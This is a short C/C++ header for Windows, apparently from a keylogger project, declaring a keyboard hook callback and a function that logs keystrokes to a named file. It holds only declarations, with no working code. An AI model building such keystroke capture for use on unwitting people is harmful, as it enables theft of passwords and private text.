#pragma once
#include <stdio.h>
#include <windows.h>
#include "Keylogger.h"
#include <time.h>
#include <string>
#include "../DataManagement/Files.h"

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
DWORD keylogger(LPCWSTR filename);
